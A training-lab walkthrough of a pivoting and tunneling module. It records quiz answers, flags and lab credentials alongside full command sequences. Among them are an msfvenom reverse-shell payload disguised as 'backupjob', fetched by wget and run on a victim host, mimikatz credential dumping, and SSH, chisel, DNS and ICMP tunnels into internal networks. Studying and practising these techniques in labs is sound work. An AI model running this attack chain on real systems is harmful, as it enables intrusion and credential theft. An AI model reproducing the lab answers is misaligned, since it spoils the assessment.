---
title: CPTS labs - 11 Pivoting Tunneling and Port Forwarding
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - certification
  - CPTS
  - labs
---
# CPTS labs - 11 Pivoting Tunneling and Port Forwarding

## [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158)

### Introduction

**Reference the Using ifconfig output in the section reading. Which NIC is assigned a public IP address?**

Results: eth0


**Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for a host with the IP address of 10.129.10.25, out of which NIC will the packet be forwarded?**

Results: tun0


**Reference the Routing Table on Pwnbox output shown in the section reading. If a packet is destined for www.hackthebox.com what is the IP address of the gateway it will be sent to?**

Results: 178.62.64.1


### Choosing The Dig Site & Starting Our Tunnels

SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!"
You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)

```
ssh ubuntu@$ip -D 1234
ip a
```

Results: 3

Apply the concepts taught in this section to pivot to the internal network and use RDP (credentials: victor:pass@123) to take control of the Windows target on 172.16.5.19. Submit the contents of Flag.txt located on the Desktop.

```
# Configure proxychains.
sudo nano /etc/proxychains4.conf
# Adding the last line: socks5 127.0.0.1 1234

# Set the dynamic port:
ssh ubuntu@$ip -D 1234 
# Scan the NIC in the connection
ip a

# Open a different terminal and run a nmap on the network range to discover ips (another network) from the victim's
proxychains nmap -v -sT -Pn 172.16.5.1-255

# In the results you will see 172.16.5.19. Now run a nmap on that ip
proxychains nmap -v -sT -Pn 172.16.5.19
# Open ports: 
# 53/tcp   open  domain
# 80/tcp   open  http
# 88/tcp   open  kerberos-sec
# 135/tcp  open  msrpc
# 139/tcp  open  netbios-ssn
# 389/tcp  open  ldap
# 445/tcp  open  microsoft-ds
# 464/tcp  open  kpasswd5
# 593/tcp  open  http-rpc-epmap
# 636/tcp  open  ldapssl
# 3268/tcp open  globalcatLDAP
# 3269/tcp open  globalcatLDAPssl
# 3389/tcp open  ms-wbt-server

# In a different terminal
export user="victor"
export pass="pass@123" 
proxychains xfreerdp  /u:$user /p:$pass /v:172.16.5.19
# And you will get a RDP connection. Open the flag.txt
```

Results: N1c3Piv0t

**SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!"**
**Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)**

```
# Configure proxychains.
sudo nano /etc/proxychains4.conf
# Adding the last line: socks5 127.0.0.1 1234

# Set the dynamic port:
ssh ubuntu@$ip -D 1234 
# Scan the NIC in the connection
ip a
```

Results: 172.16.5.129

**What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)**

Results: 0.0.0.0


**What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)**

```
# Configure proxychains.
sudo nano /etc/proxychains4.conf
# Adding the last line: socks5 127.0.0.1 1234

# Set the dynamic port:
ssh ubuntu@$ip -D 1234 
# Scan the NIC in the connection
ip a

# Open a different terminal and run a nmap on the network range to discover ips (another network) from the victim's
proxychains nmap -v -sT -Pn 172.16.5.1-255

# In the results you will see 172.16.5.19. Now run a nmap on that ip
# Open ports: 
# 53/tcp   open  domain
# 80/tcp   open  http
# 88/tcp   open  kerberos-sec
# 135/tcp  open  msrpc
# 139/tcp  open  netbios-ssn
# 389/tcp  open  ldap
# 445/tcp  open  microsoft-ds
# 464/tcp  open  kpasswd5
# 593/tcp  open  http-rpc-epmap
# 636/tcp  open  ldapssl
# 3268/tcp open  globalcatLDAP
# 3269/tcp open  globalcatLDAPssl
# 3389/tcp open  ms-wbt-server

```

Results: 172.16.5.19,172.16.5.129

**Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)**

Results: 172.16.5.0/255.255.254.0 via 10.129.202.64

### Playing Pong with Socat

**SSH tunneling is required with Socat. True or False?**

Results: False


**What Meterpreter payload did we use to catch the bind shell session? (Submit the full path as the answer)**

Results: windows/x64/meterpreter/bind_tcp


###  Pivoting Around Obstacles

**From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.**

Results: Attack Host


**From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.**

Results: Pivot Host


**SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!". Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer.**

```
# Kali, terminal 1, copy the rpivot folder and run the server 
scp -r rpivot ubuntu@$UbuntuIP:/home/ubuntu/
cd rpivot/ 
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Kali, terminal 2, connect to the ubuntu machine and run the rpivot client
ssh ubuntu@$ip
cd rpivot/
python2.7 client.py --server-ip $KaliIP --server-port 9999

# Kali, terminal 3, edit proxychains4.conf file and add the line ' sock4 127.0.0.1 9050' at the last line
sudo nano /etc/proxychains4.conf  

# Kali, terminal 3, connect to the internal web server:
proxychains firefox-esr $ipWebServer
```

Results: I_L0v3_Pr0xy_Ch@ins


RDP to $ip  with user "htb-student" and password "HTB_@cademy_stdnt!". Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)

```
# From kali, terminal 1, connect to the windows machine
xfreerdp  /u:"htb-student" /p:"HTB_@cademy_stdnt\!" /v:$ipWindows

# Run Powershell as Administrator and execute:
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=$IpInterface1Windows connectport=3389 connectaddress=$IpInterface2Windows

# Make sure the connection is saved
netsh.exe interface portproxy show v4tov4

# From kali, terminal 2, connect to the Target:
xfreerdp  /u:victor /p:pass@123 /v:$IpInterface1Windows:8080

# Browse to the file and capture the flag
```

Results: Jim Flipflop

### Branching Out Our Tunn

RDP to 10.129.42.198 (ACADEMY-PIVOTING-WIN10PIV) with user "htb-student" and password "HTB_@cademy_stdnt!". Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer.

```
# In the kali attacker machine with ip $ip:
##################################
# Install the DNScat server
git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install

# Launch the server
sudo ruby dnscat2.rb --dns host=$ipAttackerMachine,port=53,domain=inlanefreight.local --no-cache

# See the response after launching the server. The dns server will generate a secret that we will use from the victim machine to connect

# Now, we need the client connection. As our targetted machine is Windows we download the powershell client dnscat2 to our kali
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Then, copy the dnscat2.ps1 file to the windows victim machine. For that use any of the file transfer techniques. In this case I initiated a http server from the folder where dnscat2.ps1 was
python -m http.server 8000


# Additionally, I opened a RDP connection with the windows machine:
xfreerdp  /u:"htb-student" /p:"HTB_@cademy_stdnt\!" /v:$ip


###########################################
## From the windows machine. Open a powershell
################
# Download the dnscat2 powershell client:
curl http://$ipAttackerMachine:8000/dnscat2.ps1 > dnscat2.ps1

# Install
Import-Module .\dnscat2.ps1

# Initiate the connection
Start-Dnscat2 -DNSserver $ipAttackerMachine -Domain domain.local -PreSharedSecret $secret -Exec cmd 
# $secret is obtained from the server launched in the kali machne.

###########################################
## From the kali Attacker machine
################
# We will receive the message:
# New window created: 1
# Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

# Enter the session
window -i 1

# Retrieve the flag
type C:\Users\htb-student\Documents\flag.txt
```

Results: AC@tinth3Tunnel

SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!" Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.

```
#########
# In the attacker machine
#######
git clone https://github.com/jpillora/chisel.git

cd chisel
go build


# It can be helpful to be mindful of the size of the files we transfer onto targets on our client's networks, not just for performance reasons but also considering detection.
# You can run `go build -ldflags="-s -w"` and reduce it to 7.5MB (where `-s` is “Omit all symbol information from the output file” or strip, and `-w` is “Omit the DWARF symbol table”).
go build -ldflags="-s -w"

# Copy the file to the target
scp chisel ubuntu@$ip:~/

# And connect to the machine
ssh ubuntu@$ip


#########
# In the Ubuntu compromised machine, our Pivot Host
#######

./chisel server -v -p 1234 --socks5

sudo ./chisel server --reverse -v -p 1234 --socks5
```


 SSH to $ip with user "ubuntu" and password "HTB_@cademy_stdnt!"
**Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.**

Results: `Th3$eTunne1$@rent8oring!`


 **Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer.**

```shell-session
#########
# In the attacker machine
#######
git clone https://github.com/utoni/ptunnel-ng.git

# Once the ptunnel-ng repo is cloned to our attack host, we can run the autogen.sh script located at the root of the ptunnel-ng directory. Building Ptunnel-ng with Autogen.sh
sudo ./autogen.sh 

# Another way to build the ptunnel-ng binary
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh

# After running autogen.sh, ptunnel-ng can be used from the client and server-side. We will now need to transfer the repo from our attack host to the target host
scp -r ptunnel-ng ubuntu@$ipUbuntuCompromisedMachine:~/

# Connect to the ubuntu
ssh ubuntu@$ipUbuntuCompromisedMachine
```


**2.** Start the ptunnel-ng Server on the Target Host

```shell-session
#########
# In the Ubuntu compromised machine, our Pivot Host
#######
sudo ./ptunnel-ng/src/ptunnel-ng -r$ipUbuntuCompromisedMachine -R22
```

**3.** With the ptunnel-ng ICMP tunnel successfully established, we can attempt to connect to the target using SSH through local port 2222 (-p2222).

```shell-session
#########
# In the attacker machine
#######

# Connecting to ptunnel-ng Server from Attack Host
sudo ./src/ptunnel-ng -p$ipUbuntuCompromisedMachine -l2222 -r$ipUbuntuCompromisedMachine -R22
```

Now we can use proxychains with RDP to connect to the machine in the other network range:

```shell-session
# First, enable Dynamic Port Forwarding over SSH
ssh -D 9050 -p2222 -lubuntu 127.0.0.1

# Now we can use proxychains with nmap
proxychains xfreerdp  /u:$user /p:$password /v:172.16.5.19
```

Results: N3Tw0rkTunnelV1sion!


### Double Pivots
RDP to $ip with user "htb-student" and password "HTB_@cademy_stdnt!"
**Use the concepts taught in this section to pivot to the Windows server at 172.16.6.155 (jason:WellConnected123!). Submit the contents of Flag.txt on Jason's Desktop.**

Our goal will be reaching the attacked machine 3. 

**1.** First, we download appropriate binaries to our kali attack host:

- [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases)
- [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)


**2.**  Attacking machine 1

Connect to the target using xfreerdp and transfer SocksOverRDPx64.zip to the Windows target machine. Once done, unzip it.

From the Windows machine 1, we will then need to load the SocksOverRDP.dll (located within the SocksOverRDP-x64 folder) using regsvr32.exe. **Do it as Admin**

```cmd-session
regsvr32.exe SocksOverRDP-Plugin.dll
```

**3.** Attacking machine 2

Now, from the machine 1, we can connect to machine 2  over RDP using `mstsc.exe`. Windows-R and enter mstsc.exe. Enter the machine 2 IP 172.16.5.19, username and password. When doing so,  we should receive a prompt that the SocksOverRDP plugin is enabled. And we will have access to the machine 2 from the RDP connection done from machine 1.

**4.** Attacking machine 3

Now we need to transfer SocksOverRDPx64.zip or just the SocksOverRDP-Server.exe to machine 2, 172.16.5.19.  You can just try to copy paste it.


When done, **start SocksOverRDP-Server.exe with Admin privileges** in machine 2.

When we go back to our foothold target (machine 1) and check with Netstat, we should see our SOCKS listener started on 127.0.0.1:1080.

```cmd-session
netstat -antb | findstr 1080
```

Also, we transfer from our kali machine to the machine 1, the proxifier portable. Once done we configure it in machine 1 to forward all our packets to 127.0.0.1:1080. Use SOCKS5 as protocol. 

```
Open proxifier and go to Profile > Proxy server. Click on "Add..."
```

With Proxifier configured and running, we can **start mstsc.exe**, and it will use Proxifier to pivot all our traffic via 127.0.0.1:1080, which will tunnel it over RDP to 172.16.5.19, which will then route it to 172.16.6.155 using SocksOverRDP-server.exe.

So, now Windows-R and mstsc.exe to connect to machine 3 with username and password. If there are some problems with the connection, play in RDP program with the tab EXPERIENCE.

Results: H0pping@roundwithRDP!

### Skill assessments
A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a `web shell` in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are `below`:

**Objectives**

- Start from external (`Pwnbox or your own VM`) and access the first system via the web shell left in place.
- Use the web shell access to enumerate and pivot to an internal host.
- Continue enumeration and pivoting until you reach the `Inlanefreight Domain Controller` and capture the associated `flag`.
- Use any `data`, `credentials`, `scripts`, or other information within the environment to enable your pivoting attempts.
- Grab `any/all` flags that can be found.


**Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.**

```
# Enumerate $ip
sudo nmap $ip
# It will return port 80 and 22. Open a browser and go to http://$ip. It's a reverse shell. 
cd /home
ls -la
# You will get two users. Have a look at webadmin. 
ls -la /home/webadmin
# You will get a id_rsa file. Copy it to your kali machine and use it to connect again via ssh as webadmin
ssh -i id_rsa webadmin@$ip
```

Results: webadmin


**Submit the credentials found in the user's home directory. (Format: user:password)**

```
cat for-admin-eyes-only
```

Results: mlefay:Plain Human work!


**Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.**

```
ip a

# Now we do a ping sweep
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```

Results: 172.16.5.35


**Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.**

```
###########
# I will use Module `Autoroute` in metasploit:
############

# Autoroute module allows you to set routes from a meterpreter session to a discovered subnet in the attacked machine. It allow us pivoting from one subnet to another.
# 1. Create a payload for the Ubuntu Pivot Host (our victim's machine 1):

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ipKali -f elf -o backupjob LPORT=8080

# 2. Kali machine. Different terminal. Start a multi/handler, also known as a Generic Payload Handler.
msfconsole -q
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run

# 3. Once created, kali machine, serve it with a python http server
python3 -m http.server 8001

# 4. Connect to the Ubuntu with the id_rsa and download the file
ssh -i id_rsa webadmin@ipUbuntu
wget http://$ipKali:8001/backupjob
chmod +x backupjob

# 5. Ubuntu machine, execute the file to gain a Meterpreter session in your kali
./backupjob

# 6. Once the meterpreter Session is established, send the session to the background with CTRL-z and in the same terminal use Metasploit's post-exploitation routing module `socks_proxy` to configure a local proxy on our attack host.
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 
set version 4a
run
# This SOCKS configuration will start a listener on port 9050 and route all the traffic received via our Meterpreter session.
# Even though the command line has not returned anything you can ask for the jobs in execution with:
jobs

# Make sure that your /etc/proxychains4.conf in your kali has enabled the line
socks4 127.0.0.1 9050
# Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.

# 7. Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. Use the post/multi/manage/autoroute module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.
use post/multi/manage/autoroute
set SESSION 1
set SUBNET $NewSubnet
# Example: set SUBNET 172.16.5.0
run
# This will bind session 1 to the $NewSubnet discovered in the victim's machine 1, doing the pivoting

# It is also possible to add routes with autoroute by running autoroute from the initial Meterpreter session (session 1):
sessions -i 1
run autoroute -s $NewDiscoveredIp/16

# List the active routes:
run autoroute -p

# 8. Make sure that you will get back the communications with a reverse proxy:

ssh -i id_rsa $username@$ipUbuntuCompromisedmachine -R $ipUbuntuCompromisedmachine:8080:0.0.0.0:8000

# 9. Finally, use proxychains to route our RDP session traffic via our Meterpreter session.
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:"Plain Human work\!"

```

Results: S1ngl3-Piv07-3@sy-Day


**In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?**

```
# 1. Copy mimikatz to the Windows machine 1 with CTLR-C CTRL-V. Then in the Powershell terminal
.\mimikatz.exe privilege::debug  sekurlsa::logonpasswords     

# You will see user vfrank and password
vfrank:Imply wet Unmasked!
```

Results: vfrank


**For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.**

```
# 1. Open CMD and enumerate network interfaces
ipconfig /all

# 2. Notice a new network range: 172.16.6.35. Enumerate new Ips in that new network range
for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"
# As a result now we have 172.16.6.25

# Note: I had problems with the Poweshell enumerator. For some reason this did not work for me:
1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.15.6.$($_) -quiet)"}

# 3. Windows-R and mstsc.exe. Enter 172.16.6.25 and use the creds vfrank:Imply wet Unmasked!

```

Results: N3tw0rk-H0pp1ng-f0R-FuN

**Submit the contents of C:\Flag.txt located on the Domain Controller.**

```
# 1. In the previously open session, open a windows explorer and notice the shared unit Z:\

```

Results: 3nd-0xf-Th3-R@inbow!

